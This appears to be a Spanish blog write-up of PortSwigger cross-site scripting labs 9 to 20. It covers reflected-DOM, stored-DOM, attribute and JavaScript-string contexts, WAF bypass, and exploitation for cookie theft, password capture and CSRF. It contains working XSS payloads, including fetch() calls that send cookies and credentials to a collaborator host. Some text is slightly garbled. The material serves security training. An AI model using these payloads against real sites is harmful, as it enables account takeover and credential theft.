+<p>Suele cometerse el error de que el reflected, stored y DOM-based XSS son entindades separadas, pero la realidad es que son distintos aspectos del mismo ataque y muchas veces pueden estar presentes más de uno.</p>
+
+<p>Sin embargo, <strong>las fuentes no se limitan a los datos expuestos directamente por los navegadores; también pueden originarse en el sitio web</strong>. Por ejemplo, los sitios web a menudo reflejan parámetros de URL en la respuesta HTML del servidor. Esto se asocia comúnmente con XSS normal, pero también puede dar lugar a las denominadas vulnerabilidades reflejadas+DOM.</p>
+
+<p>En una vulnerabilidad reflejada+DOM, el servidor procesa los datos de la solicitud y repite los datos en la respuesta adquiriendo la parted del reflected XSS, pero además, los datos reflejados pueden colocarse en una cadena literal de JavaScript o en un elemento de datos dentro del DOM, como un campo de formulario. Luego, un script en la página procesa los datos reflejados de una manera insegura y, en última instancia, los escribe en un sumidero peligroso adquiriendo la característica .</p>
+
+<p><br /></p>
+
+<p><strong>Laboratorio 9: Reflected DOM XSS</strong></p>
+
+<p>Este laboratorio contiene una vulnerabilidad reflected-DOM XSS. Esta recordamos que es una vulnerabilidad por la que una aplicación web devuelve en una respuesta datos de búsqueda de la request del usuario que luego procesa en un script de JavaScript derivándolo en un sumidero.</p>
+
+<p>Así, accedemos al laboratorio y utilizamos DOM Invader para comprobar dónde está la vulnerabilidad. Podemos observar que nuestros datos se encuentran en un sumidero de <em>eval()</em>. Además, podemos observar que el código no procesa adecuadamente el backslash. De forma que inyectamos: “\-alert(1)}//</p>
+
+<p>Como ha inyectado una barra invertida y el sitio no los escapa, cuando la respuesta JSON intenta escapar del carácter de comillas dobles de apertura, agrega una segunda barra invertida. La doble barra invertida resultante hace que el escape se cancele de manera efectiva. Esto significa que las comillas dobles se procesan sin escape, lo que cierra la cadena que debe contener el término de búsqueda.</p>
+
+<p><br /></p>
+
+<p><strong>Laboratorio 10: Stored DOM XSS</strong></p>
+
+<p>En este caso sucede algo similar al caso anterior en la caja de comentarios, y es que al emplear DOM Invader obtenemos que el término que introducimos pasa a través de un código que codifica los braquets en un intento de proteger de un ataque de inyección HTML:</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220628200526.png" text-align="center" />
+</div>
+
+<p>Sin embargo, por un fallo de configuración, sólo se codifica una vez y por tanto, es vulnerable a la introducción del término:** &lt;&gt;&lt;img src=1 onerror=alert(1)&gt;**.</p>
+
+<p><br /></p>
+
+<h3 id="3-utilidad-de-las-distintas-vulnerabilidades-xss">3. Utilidad de las distintas vulnerabilidades XSS.</h3>
+
+<p>La forma tradicional de demostrar que ha encontrado una vulnerabilidad de secuencias de comandos entre sitios es crear una ventana emergente con la función alert(). Esto no se debe a que XSS tenga algo que ver con las ventanas emergentes; es simplemente una forma de demostrar que puede ejecutar JavaScript arbitrario en un dominio determinado.</p>
+
+<p>Es posible que observe que algunas personas usan alert(document.domain). Esta es una forma de hacer explícito en qué dominio se está ejecutando JavaScript.</p>
+
+<p>A veces querrá ir más allá y probar que una vulnerabilidad XSS es una amenaza real proporcionando un exploit completo. En esta sección, exploraremos tres de las formas más populares y poderosas de explotar una vulnerabilidad XSS.</p>
+
+<p>Sometimes you’ll want to go further and prove that an XSS vulnerability is a real threat by providing a full exploit. In this section, we’ll explore three of the most popular and powerful ways to exploit an XSS vulnerability</p>
+
+<p><br /></p>
+
+<h4 id="31-exploiting-cross-site-scripting-to-steal-cookies">3.1. Exploiting cross-site scripting to steal cookies.</h4>
+
+<p>Robar cookies es una forma tradicional de explotar XSS. La mayoría de las aplicaciones web utilizan cookies para el manejo de la sesión. Puede explotar las vulnerabilidades XSS para enviar las cookies de la víctima a su propio dominio, luego inyectar manualmente las cookies en el navegador y hacerse pasar por la víctima.</p>
+
+<p>En la práctica, este enfoque tiene algunas limitaciones importantes:</p>
+
+<ul>
+  <li>La víctima puede no estar logeada o la sesión</li>
+  <li>Muchas aplicaciones apartan las cookies del JavaScript empleando el HttpOnly flag.</li>
+  <li>La sesión puede estar bloqueada por otros factores ajenos.</li>
+</ul>
+
+<p><br /></p>
+
+<p><strong>Laboratorio 11: Exploiting cross-site scripting to steal cookies</strong></p>
+
+<p>Este laboratorio contiene una vulnerabilidad XSS almacenada en la función de comentarios del blog.</p>
+
+<p>Un usuario víctima simulado ve todos los comentarios después de su publicación. Para resolver el laboratorio, aproveche la vulnerabilidad para filtrar la cookie de sesión de la víctima y luego use esta cookie para hacerse pasar por la víctima.</p>
+
+<p>Al acceder al laboratorio comprobamos que el parámetro “comment” es susceptible a una inyección HTML simple.</p>
+
+<p>Así empleamos el siguiente script para obtener las cookies de sesión de cualquier usuario que visite dicha página:</p>
+
+<pre><code class="language-HTML">&lt;script&gt; fetch('https://BURP-COLLABORATOR-SUBDOMAIN', { method: 'POST', mode: 'no-cors', body:document.cookie }); &lt;/script&gt;
+</code></pre>
+
+<p>Y empleamos el cliente de BurpCollaborator para el envío de las cookies de la víctima.</p>
+
+<p>Recuperamos esos parámetros para hacernos pasar por el usuario.</p>
+
+<p><br /></p>
+
+<h4 id="32-exploiting-cross-site-scripting-to-perfom-csrf">3.2. Exploiting cross-site scripting to perfom CSRF.</h4>
+
+<p>En estos días, <strong>muchos usuarios tienen administradores de contraseñas que autocompletan sus contraseñas</strong>. Puede aprovechar esto creando una entrada de contraseña, leyendo la contraseña autocompletada y enviándola a su propio dominio. Esta técnica evita la mayoría de los problemas asociados con el robo de cookies e incluso puede obtener acceso a cualquier otra cuenta en la que la víctima haya reutilizado la misma contraseña.</p>
+
+<p>La principal desventaja de esta técnica es que solo funciona en usuarios que tienen un administrador de contraseñas que realiza el autocompletado de contraseñas. (Por supuesto, si un usuario no tiene una contraseña guardada, aún puede intentar obtener su contraseña a través de un ataque de phishing en el sitio, pero no es exactamente lo mismo).</p>
+
+<p><br /></p>
+
+<p><strong>Laboratorio 12: Exploiting cross-site scripting to capture password</strong></p>
+
+<p>Este laboratorio contiene una Stored XSS vulnerability en la función de comentarios del blog.</p>
+
+<p>Un usuario víctima ve todos los comentarios después de que ser publicados. Para resolver el laboratorio, aproveche la vulnerabilidad para filtrar el nombre de usuario y la contraseña de la víctima y luego use estas credenciales para iniciar sesión en la cuenta de la víctima.</p>
+
+<p>De nuevo, encontramos en el parámetro “comment” de la sección de comentarios una inyección HTML simple. Así, empleamos el siguiente código en el server exploit:</p>
+
+<pre><code class="language-HTML">&lt;input name=username id=username&gt;
+&lt;input type=password name=password onchange="if(this.value.length)fetch('https://BURP-COLLABORATOR-SUBDOMAIN',{ method:'POST', mode: 'no-cors', body:username.value+':'+this.value });"&gt;
+</code></pre>
+
+<p>Para recibir la contraseña y el usuario en el BurpCollaborator client.</p>
+
+<p><br /></p>
+
+<h4 id="33-exploiting-cross-site-scripting-to-perfom-csrf">3.3. Exploiting cross-site scripting to perfom CSRF.</h4>
+
+<p><strong>Cualquier cosa que un usuario legítimo pueda hacer en un sitio web, probablemente también pueda hacerlo con XSS</strong>.</p>
+
+<p>Dependiendo del sitio al que se dirija, es posible que pueda hacer que una víctima envíe un mensaje, acepte una solicitud de amistad, envíe una puerta trasera a un repositorio de código fuente o transfiera algo de Bitcoin.</p>
+
+<p>Algunos sitios web permiten a los usuarios registrados cambiar su dirección de correo electrónico sin volver a ingresar su contraseña. Si ha encontrado una vulnerabilidad XSS, puede activar esta funcionalidad para cambiar la dirección de correo electrónico de la víctima a una que usted controle y luego activar un restablecimiento de contraseña para obtener acceso a la cuenta.</p>
+
+<p>Este tipo de explotación generalmente se conoce como falsificación de solicitud entre sitios (CSRF), lo cual es un poco confuso porque CSRF también puede ocurrir como una vulnerabilidad independiente. Cuando CSRF ocurre como una vulnerabilidad independiente, se puede parchear usando estrategias como tokens anti-CSRF. Sin embargo, estas estrategias no brindan ninguna protección si también está presente una vulnerabilidad XSS.</p>
+
+<p><br /></p>
+
+<p><strong>Laboratorio 13: Exploit XSS to perfom CSRF</strong></p>
+
+<p>Este laboratorio contiene una stored XSS vulnerability en la sección de los comentarios. Para resolver el laboratorio debemos explotar un CSRF attack y cambiar el email de la víctima que viene a visitar los comentarios.</p>
+
+<p>Vamos a emplear el siguiente script:</p>
+
+<pre><code class="language-HTML">&lt;script&gt; var req = new XMLHttpRequest(); req.onload = handleResponse; req.open('get','/my-account',true); req.send(); function handleResponse() { var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1]; var changeReq = new XMLHttpRequest(); changeReq.open('post', '/my-account/change-email', true); changeReq.send('csrf='+token+'&amp;email=test@test.com') }; &lt;/script&gt;
+</code></pre>
+
+<p>En el parámetro de “comment” en los comentarios de cualquier post.</p>
+
+<p><br /></p>
+
+<h3 id="4-cómo-encontrar-y-testear-vulnerabilidades-xss">4. Cómo encontrar y testear vulnerabilidades XSS.</h3>
+
+<p>La gran mayoría de las vulnerabilidades XSS se pueden encontrar de forma rápida y confiable utilizando el escáner de vulnerabilidades web de Burp Suite.</p>
+
+<p>La prueba manual de los reflected y stored XSS normalmente implica enviar una entrada única simple (como una cadena alfanumérica corta) en cada punto de entrada en la aplicación, identificar cada ubicación donde la entrada enviada se devuelve en las respuestas HTTP y probar cada ubicación individualmente para determinar si la entrada diseñada adecuadamente se puede utilizar para ejecutar JavaScript arbitrario. De esta forma, puede determinar el contexto en el que se produce el XSS y seleccionar una carga útil adecuada para explotarlo.</p>
+
+<p>La prueba manual de XSS basado en DOM que surge de los parámetros de URL implica un proceso similar: colocar una entrada única simple en el parámetro, usar las herramientas de desarrollo del navegador para buscar esta entrada en el DOM y probar cada ubicación para determinar si es explotable. Sin embargo, otros tipos de DOM XSS son más difíciles de detectar. Para encontrar vulnerabilidades basadas en DOM en entradas no basadas en URL (como document.cookie) o sumideros no basados en HTML (como setTimeout), no hay sustituto para revisar el código JavaScript, que puede llevar mucho tiempo.</p>
+
+<p>El escáner de vulnerabilidades web de Burp Suite combina el análisis estático y dinámico de JavaScript para automatizar de manera confiable la detección de vulnerabilidades basadas en DOM.</p>
+
+<p><br /></p>
+
+<h4 id="41-cross-site-scripting-context">4.1. Cross-site scripting context.</h4>
+
+<p>Cuando buscamos reflected y stored XSS es importante identificar el contexto XSS:</p>
+
+<ul>
+  <li>La localización del input del usuario en la respuesta.</li>
+  <li>El procesamiento que sufre el input que introduce el usuario en el caso de que este de refleje en alguna parte de la respuesta HTTP.</li>
+</ul>
+
+<p><br /></p>
+
+<h4 id="42-xss-between-html-tags">4.2. XSS between HTML tags.</h4>
+
+<p><strong>Laboratorio 14: Reflected XSS into HTML context with most tags and attributes blocked</strong></p>
+
+<p>Este laboratorio contiene una vulnerabilidad XSS reflected en la funcionalidad de búsqueda per utiliza un WAF para proteger contra ataques XSS comúnes. Sin embargo, el WAF está configurado por lista negra que puede ser débil ya que puede ser que exista alguna combinación tag-evento potencialmente dañina que no esté bloqueda. Para comprobarlo podemos recurrir a un atauqe de fuerza bruta basado en lista primero con tags y si encontramos alguno, con eventos.</p>
+
+<p>Así, buscamos un término y capturamos la request. La envíamos al BurpIntruder y realizamos un ataque de fuerza bruta con los eventos HTML del XSS Cheat Shet de Portswigger, obteniendo:</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220628202207.png" text-align="center" />
+</div>
+
+<p><br /></p>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220628202230.png" text-align="center" />
+</div>
+
+<p>Seguidamente, modificamos el valor del parámetro “search” como:</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220628202330.png" text-align="center" />
+</div>
+
+<p>Y cambiamos la lista del payload de los tags a los eventos:</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220628202413.png" text-align="center" />
+</div>
+
+<p>Así, tenmos que el evento “onresize” está disponible, lo que provocará la ejecución de código javascript cuando se tenga que ajustar la resolución de la ventana del navegador.</p>
+
+<p>Por ello, cargamos el siguiente código iframe en el server exploit:</p>
+
+<pre><code class="language-HTML">&lt;iframe src="https://your-lab-id.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=print()%3E" onload=this.style.width='100px'&gt;
+</code></pre>
+
+<p>Esto reajustará automáticamente la resolución de la ventana nadamás cargar el iframe, provocando la ejecución automática del código malicioso. Le damos a “Deliver to victim” y habríamos completado el laboratorio.</p>
+
+<p><br /></p>
+
+<p><strong>Laboratorio 15: Reflected XSS into HTML context with all tags blocked except custom ones</strong></p>
+
+<p>Repitiendo la operación anterior obtenemos el tag “id” con el evento “onfocus”. Quedando la solución como:</p>
+
+<pre><code class="language-HTML">&lt;script&gt; location = 'https://your-lab-id.web-security-academy.net/?search=%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E#x'; &lt;/script&gt;
+</code></pre>
+
+<p><br /></p>
+
+<p><strong>Laboratorio 16: Reflected XSS with some SVG markup allowed</strong></p>
+
+<p>Este laboratorio tiene una vulnerabilidad Reflejada XSS simple. El sitio está bloqueando etiquetas comunes pero pierde algunas etiquetas y eventos SVG.</p>
+
+<p>Para resolver el laboratorio, realice un ataque de secuencias de comandos entre sitios que llame a la función alert().</p>
+
+<p><br /></p>
+
+<p>De nuevo procediendo como en los laboratorios anteriores obtenemos que el término</p>
+
+<pre><code class="language-HTML">&lt;svg&gt;&lt;animatetransform onbegin=alert(1)&gt;
+</code></pre>
+
+<p>está permitido, por tanto, resolvemos el laboratorio mediante el link:</p>
+
+<pre><code class="language-HTML">&lt;ifrema src="https://your-lab-id.web-security-academy.net/?search=%22%3E%3Csvg%3E%3Canimatetransform%20onbegin=alert(1)%3E"&gt;
+</code></pre>
+
+<p><br /></p>
+
+<h4 id="43-xss-in-html-tag-attributes">4.3. XSS in HTML tag attributes.</h4>
+
+<p>Existen casos en los que se encodean los braquets angulares: “&gt;”, “&lt;” pero no se encondean el resto de elementos. Sin embargo, aunque aquí la aplicación ya no es vulnerable a una inyección de entidad HTML todavía puede inyectarse un evento dañino que permita la ejecución de código JavaScript.</p>
+
+<p><br /></p>
+
+<p><strong>Laboratorio 17: Reflected XSS into attribute with angle brackets HTML-encoded</strong></p>
+
+<p>Este laboratorio contiene una vulnerabilidad Reflected XSS pero se encodean los braquest angulares ya que al intentar inyectar un elemento HTML no obtenemos resultado. Sin embargo podemos observar que nuestro término de búsqueda también se queda incrustado a modo de atributo en un elemento HTML,</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220629082533.png" text-align="center" />
+</div>
+
+<p>Así, completamos el laboratorio introduciendo: “onmouseover=”alert(1) que desencadenará una alerta cada vez que se mueva el ratón por la ventana del navegador.</p>
+
+<p><br /></p>
+
+<p>También puede ocurrir que en una sección de comentarios se nos permita poner una referncia a un sitio web mediante un atributo “href”, en tal caso, la página puede ser vulnerable al payload <em>javascript:&lt;javascriptcode&gt;</em>.</p>
+
+<p><br /></p>
+
+<p><strong>Laboratorio 18: Stored XSS into anchor href attribute with double quotes HTML-encoded</strong></p>
+
+<p>Entramos al laboratorio que simula una aplicación web con posts en los que es posible incorporar un sitio web mediante un atributo href:</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220629084518.png" text-align="center" />
+</div>
+
+<p>De esta forma colocamos el payload javascript:alert(1) y completamos el laboratorio.</p>
+
+<p><br /></p>
+
+<p>En algunos casos se puede hacer uso del “canonical tag” que es una forma por la que un usuario interactúa con el navegador y que al intearactúar con el DOM desencadena Javascript. Dependiendo del sistema operatibo el canonical tag puede desencadenarse medainte el siguiente conjunto de teclas:</p>
+
+<ul>
+  <li>ALT+SHIFT+X</li>
+  <li>CTRL+ALT+X</li>
+  <li>Alt+X</li>
+</ul>
+
+<p>El laboratorio se completa añadiendo el parámetro: /?%27accesskey=%27x%27onclick=%27alert(1) a la URL del sitio web y comprobando como pulsando alguna combinación de teclas de entre las anteriores se obtiene el código JavaScript.</p>
+
+<p><br /></p>
+
+<h4 id="44-xss-in-javascript">4.4. XSS in JavaScript.</h4>
+
+<p>Puede ser que el término reflejado se refleje en un plantilla JavaScript presente en la respuesta HTTP. De esta forma, podemos, si el input no se valida adecuadamente, cerrar el tag &lt;script&gt; e inyectar HTML:</p>
+
+<p><br /></p>
+
+<p><strong>Laboratorio 18: Reflected XSS into a JavaScript string with single quote and backslash escaped</strong></p>
+
+<p>Accedemos al laboratorio y comprobamos que nuestro término se refleja en una plantilla JavaScript:</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220629091357.png" text-align="center" />
+</div>
+
+<p>Haciendo una serie de prueba comprobamos que se puede inyectar HTML en dicha plantilla y terminamos el laboratorio inyecatndo un elemento script: &lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;.</p>
+
+<p><br /></p>
+
+<p>También podemos intentar inyecat código JavaScript en la plantilla.</p>
+
+<p><br /></p>
+
+<p><strong>Laboratorio 19: Reflected XSS into a JavaScript string with angle brackets HTML encoded</strong></p>
+
+<p>Este laboratorio contiene una vulnerabilidad Reflected XSS en la search query en el que es imposible inyectar HTML. Sin embargo nuestro input se refleja en una plantilla JavaScript:</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220629092129.png" text-align="center" />
+</div>
+
+<p>De esta forma, podemos intentar inyecat JavaScript mediante: ‘-alert(1)-‘</p>
+
+<p><br /></p>
+
+<p><strong>Laboratorio 20: Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped</strong></p>
+
+<p>Este laboratorio contiene de nuevo una vulnerabilidad XSS que se refleja en una plantilla JavaScript:</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220629094655.png" text-align="center" />
+</div>
+
+<p>Así, introducmos el siguiente payload: ‘;-alert(1)// para inyectar JavaScript.</p>
+
